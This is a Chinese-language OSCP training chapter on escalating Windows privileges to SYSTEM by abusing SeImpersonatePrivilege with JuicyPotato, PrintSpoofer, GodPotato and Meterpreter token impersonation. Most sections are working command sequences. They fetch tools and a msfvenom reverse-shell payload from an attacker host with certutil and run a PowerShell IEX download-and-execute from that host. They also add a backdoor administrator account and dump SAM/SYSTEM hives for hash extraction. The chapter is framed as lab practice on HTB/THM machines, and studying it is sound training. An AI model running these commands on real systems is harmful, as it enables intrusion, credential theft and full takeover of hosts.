# Ch 27 — Token 竊取：SeImpersonatePrivilege + Potato

> 目標：理解 Windows Token 機制，掌握 Potato 系列工具利用 SeImpersonatePrivilege 提權到 SYSTEM。

## SeImpersonatePrivilege 的重要性

```cmd
whoami /priv

Privilege Name                Description                    State
============================= ============================== ========
SeImpersonatePrivilege        Impersonate a client...        Enabled
```

**看到這行就是在說「你可以提權到 SYSTEM」。**

這個特權通常在：
- IIS（Web 服務帳號 `IIS APPPOOL\...`）
- SQL Server 服務帳號
- MSSQL `xp_cmdshell` 拿到的 shell
- 某些應用程式服務帳號

**OSCP 上最高頻的 Windows 提權技術。**

## Token 的概念

Windows 每個程序都有一個 Access Token，決定它能做什麼。

- **Primary Token**：程序本身的身份
- **Impersonation Token**：一個程序「扮演」另一個身份

`SeImpersonatePrivilege` 讓你能扮演其他 Token 的身份——如果你能讓 SYSTEM 連到你的程序，你就能竊取它的 Token，變成 SYSTEM。

## Potato 攻擊系列

Potato 系列是一組利用 COM/RPC 讓 NT AUTHORITY\SYSTEM 連回來的攻擊，核心就是竊取 SYSTEM Token。

### 選哪個 Potato？

```
Windows 版本 / 環境              → 用哪個 Potato
────────────────────────────────────────────────────
Windows 10 1809 之前 / Server 2016 之前  → JuicyPotato
Windows 10 1809+ / Server 2019+  → PrintSpoofer 或 GodPotato
Windows 11 / 現代環境             → GodPotato 或 SweetPotato
```

### JuicyPotato

**環境要求**：需要指定 CLSID（COM 服務 ID），不同 Windows 版本 CLSID 不同

```bash
# 1. 下載 JuicyPotato.exe 到靶機
certutil -urlcache -f http://10.10.14.5/JuicyPotato.exe C:\Windows\Temp\jp.exe

# 2. 找對應版本的 CLSID
# http://ohpe.it/juicy-potato/CLSID/
# 根據 systeminfo 的 OS 版本找

# 3. 生成 payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f exe -o rev.exe
certutil -urlcache -f http://10.10.14.5/rev.exe C:\Windows\Temp\rev.exe

# 4. Kali 開監聽
nc -nvlp 5555

# 5. 執行
C:\Windows\Temp\jp.exe -t * -p C:\Windows\Temp\rev.exe -l 9999 -c {CLSID}
# -t *    = 試 create / impersonate
# -p      = 要執行的程式
# -l      = 本地監聽 port（任意）
# -c      = CLSID
```

### PrintSpoofer（Windows 10 1809 / Server 2019）

不需要 CLSID，更簡單：

```cmd
# 下載
certutil -urlcache -f http://10.10.14.5/PrintSpoofer64.exe C:\Windows\Temp\ps.exe

# 方法一：直接開 SYSTEM shell
C:\Windows\Temp\ps.exe -i -c cmd

# 方法二：執行指令
C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\rev.exe"
```

### GodPotato（最廣泛相容）

```cmd
# 下載
certutil -urlcache -f http://10.10.14.5/GodPotato-NET4.exe C:\Windows\Temp\gp.exe

# 執行 cmd（以 SYSTEM）
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"

# 反彈 shell
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\rev.exe"
```

### Meterpreter 下的 Potato

```bash
# Meterpreter session 下
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > getuid    # 確認是 SYSTEM
```

## nc.exe 或 PowerShell 作為 Payload

有時候反彈 shell binary 不好用（AV 擋），試其他方式：

```cmd
# Potato 執行 net user 直接加管理員（無需 shell）
C:\Windows\Temp\ps.exe -c "net user hacker P@ssword! /add"
C:\Windows\Temp\ps.exe -c "net localgroup administrators hacker /add"

# 確認
net localgroup administrators
# 然後用 psexec 或 RDP 登入

# 或 PowerShell 反彈
C:\Windows\Temp\ps.exe -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
```

## SeAssignPrimaryTokenPrivilege

如果你有這個（而不是 SeImpersonate），效果類似，也可以用 Potato 系列。

## SeBackupPrivilege

不是直接提權，但能讀任何檔案：

```cmd
# 讀 SAM 和 SYSTEM 登錄（含密碼 hash）
Import-Module .\SeBackupPrivilegeUtils.dll
Save-Registry -path sam -destination C:\Temp\sam.hive
Save-Registry -path system -destination C:\Temp\system.hive

# 在 Kali 提取 hash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

## 常見問題

### JuicyPotato 說「DCOM is not allowed」

→ 該版本 Windows 已封鎖 JuicyPotato → 換 PrintSpoofer 或 GodPotato

### PrintSpoofer 說「can't start pipe server」

→ 確認是在 IIS 或服務帳號下執行，不能在 interactive 登入帳號
→ 確認 `SeImpersonatePrivilege` 是 Enabled

## 本章對應靶機

| 機器 | Potato 類型 |
|------|-----------|
| HTB Devel | 較舊 Windows，JuicyPotato 或 MS11-046 |
| HTB Bounty | 較舊 Windows，JuicyPotato |
| HTB Bastard | JuicyPotato |
| THM Relevant | PrintSpoofer |

## 自我檢核

- [ ] 知道 `SeImpersonatePrivilege` 出現在哪些服務帳號下
- [ ] 知道 JuicyPotato / PrintSpoofer / GodPotato 各適用哪個 Windows 版本
- [ ] 能執行 PrintSpoofer 直接取得 SYSTEM shell（`-i -c cmd`）
- [ ] 知道取得 SYSTEM 後要截圖什麼（proof.txt + ipconfig）

→ [Ch 28 AlwaysInstallElevated / 排程任務 / Registry](./28-windows-misc-privesc.md)
